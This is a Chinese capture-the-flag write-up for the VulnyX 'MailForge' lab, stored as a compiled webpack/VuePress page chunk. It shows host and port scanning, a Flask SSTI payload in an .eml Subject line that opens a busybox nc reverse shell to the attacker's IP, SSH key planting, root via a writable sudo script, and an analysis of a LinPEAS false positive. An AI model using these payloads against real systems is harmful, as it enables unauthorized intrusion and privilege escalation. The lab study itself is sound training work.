(window.webpackJsonp=window.webpackJsonp||[]).push([[162],{526:function(s,a,n){"use strict";n.r(a);var t=n(11),e=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"存活主机扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#存活主机扫描"}},[s._v("#")]),s._v(" 存活主机扫描")]),s._v(" "),a("p",[s._v("使用 arp-scan 扫描局域网内存活主机。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" arp-scan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-I")]),s._v(" eth2 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.0/24      \n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.196   08:00:27:aa:a2:0f       "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Unknown"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("目标主机 IP：192.168.6.196")]),s._v(" "),a("h2",{attrs:{id:"端口扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#端口扫描"}},[s._v("#")]),s._v(" 端口扫描")]),s._v(" "),a("p",[s._v("nmap 扫描 TCP 全端口。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nmap "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.196 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sT")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sV")]),s._v(" -p-\n\nPORT     STATE SERVICE VERSION\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("/tcp   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("     OpenSSH "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.2")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("protocol "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2.0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("/tcp   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http    nginx\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5000")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http    Werkzeug httpd "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3.1")]),s._v(".4 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Python "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3.12")]),s._v(".12"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("开放了 22、80、5000 端口。")]),s._v(" "),a("h2",{attrs:{id:"_80-端口-web-服务探测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_80-端口-web-服务探测"}},[s._v("#")]),s._v(" 80 端口 Web 服务探测")]),s._v(" "),a("p",[s._v("访问 80 端口，跳转到 http://mailforge.nyx/，本地配置一个 hosts 解析再访问")]),s._v(" "),a("p",[s._v("首页返回了 MailForge say's : Hello")]),s._v(" "),a("p",[s._v("对 80 端口进行常规的目录扫描，未发现有用信息。")]),s._v(" "),a("h2",{attrs:{id:"_5000-端口-web-服务探测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5000-端口-web-服务探测"}},[s._v("#")]),s._v(" 5000 端口 Web 服务探测")]),s._v(" "),a("p",[s._v("访问 5000 端口，出现一个邮件上传 eml 文件预览的页面。")]),s._v(" "),a("p",[s._v("创建一个 eml 文件，写入以下内容：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("From: sender@example.com\nTo: recipient@example.com\nSubject: 邮件主题\nDate: Mon, 1 Jan 2024 12:00:00 +0800\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: 8bit\n\n这是邮件的正文内容。\n这是一封测试邮件。\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/vulnyx-mailforge/1.png",alt:""}})]),s._v(" "),a("p",[s._v("后端是 python flask 框架搭建的，尝试一下是否存在 SSTI 漏洞。")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("From: sender@example.com\nTo: recipient@example.com\nSubject: {{config}}\nDate: Mon, 1 Jan 2024 12:00:00 +0800\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: 8bit\n\n这是邮件的正文内容。\n这是一封测试邮件。\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[s._v("确认存在 SSTI 漏洞。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/vulnyx-mailforge/2.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"利用-ssti-漏洞反弹-shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#利用-ssti-漏洞反弹-shell"}},[s._v("#")]),s._v(" 利用 SSTI 漏洞反弹 shell")]),s._v(" "),a("p",[s._v("尝试执行命令，反弹个shell")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("From: sender@example.com\nTo: recipient@example.com\nSubject: {{url_for.__globals__.__builtins__['eval']('__import__(\"os\").popen(\"busybox nc 192.168.6.101 4444 -e bash\").read()')}}\nDate: Mon, 1 Jan 2024 12:00:00 +0800\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: 8bit\n\n这是邮件的正文内容。\n这是一封测试邮件。\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[s._v("这个 shell 环境非常难用，下载kali准备的公钥进去，ssh 直接连上来。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" .ssh\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.101/authorized_keys "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-O")]),s._v(" .ssh/authorized_keys\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("600")]),s._v(" .ssh/authorized_keys\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("ssh 登录")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/vulnyx-mailforge/3.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"可写-sudo-脚本提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#可写-sudo-脚本提权"}},[s._v("#")]),s._v(" 可写 sudo 脚本提权")]),s._v(" "),a("p",[s._v("查看当前用户权限，可以 sudo 无密码执行 /usr/local/bin/cleaner.sh 脚本，并且这个脚本可写。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/vulnyx-mailforge/4.png",alt:""}})]),s._v(" "),a("p",[s._v("直接修改内容，进入 root shell。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/vulnyx-mailforge/5.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"linpeas-误报"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#linpeas-误报"}},[s._v("#")]),s._v(" linpeas 误报")]),s._v(" "),a("p",[s._v("跑了下 linpeas，发现有 suid 的 doas （可能需要配置文件才能利用）。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/vulnyx-mailforge/6.png",alt:""}})]),s._v(" "),a("p",[s._v("LinPEAS 报告显示几乎所有密码都能登录 root，这显然是误报。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/vulnyx-mailforge/7.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("  Bruteforcing user root...\n  You can login as root using password: \n  You can login as root using password: root\n  You can login as root using password: toor\n  You can login as root using password: 123456\n  You can login as root using password: password\n  You can login as root using password: 123456789\n  You can login as root using password: 12345678\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("检查 "),a("code",[s._v("su")]),s._v(" 二进制文件发现它是指向 "),a("code",[s._v("bbsuid")]),s._v(" 的软链接，这是 "),a("strong",[s._v("BusyBox")]),s._v(" 提供的 "),a("code",[s._v("su")]),s._v(" 实现。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mailforge@mailforge:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("which")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v("\n/bin/su\nmailforge@mailforge:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" /bin/su\nlrwxrwxrwx    "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root     root            "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),s._v(" Dec "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("13")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("17")]),s._v(":02 /bin/su -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /bin/bbsuid\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("查看 LinPEAS 源码中负责爆破的函数 su_try_pwd，其逻辑如下：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mailforge@mailforge:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" linpeas.sh "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-A10")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-B10")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'You can login'")]),s._v(" \n"),a("span",{pre:!0,attrs:{class:"token function-name function"}},[s._v("su_try_pwd")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("BFUSER")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$1")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("PASSWORDTRY")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$2")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 关键点：捕获 stdout，丢弃 stderr (2>/dev/null)")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("trysu")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$(")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$PASSWORDTRY")]),s._v('"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("timeout")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v(" $BFUSER "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v(")")])]),s._v("\n  \n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 只要 stdout 非空，即判定为成功")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$trysu")]),s._v('"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("then")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"  You can login as '),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$BFUSER")]),s._v(" using password: "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$PASSWORDTRY")]),s._v('"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("fi")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br")])]),a("p",[s._v("LinPEAS 的逻辑假设是：只有登录成功并执行 whoami 后，stdout 才会有内容（即输出用户名）；而失败时的报错应该在 stderr 中被丢弃。")]),s._v(" "),a("p",[s._v("然而，我在靶机上进行了验证测试：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mailforge@mailforge:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v(" root\nPassword: \nsu: incorrect password\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 关键测试：将 stderr 丢弃后，依然能看到输出")]),s._v("\nmailforge@mailforge:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v(" root "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\nPassword: \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v('测试结果表明： BusyBox 的 su 在交互/管道模式下，将部分提示信息（如 "Password: " 或其他错误提示）输出到了 标准输出 (stdout)，而不是标准错误 (stderr)。')]),s._v(" "),a("p",[s._v("因此，LinPEAS 的 trysu 变量捕获到了这些提示信息（非空），从而错误地进入了 if 分支，导致脚本认为所有密码均有效。")]),s._v(" "),a("p",[s._v("在我的 kali 机上进行测试，Password 提示符是输出到了 stderr：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/vulnyx-mailforge/8.png",alt:""}})]),s._v(" "),a("p",[s._v("修复建议：")]),s._v(" "),a("p",[s._v("使用 "),a("code",[s._v("$?")]),s._v(" 检查 su 命令的退出状态码，不依赖 stdout 内容。su 成功时返回 0，失败时返回非 0。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/vulnyx-mailforge/9.png",alt:""}})])])}),[],!1,null,null,null);a.default=e.exports}}]);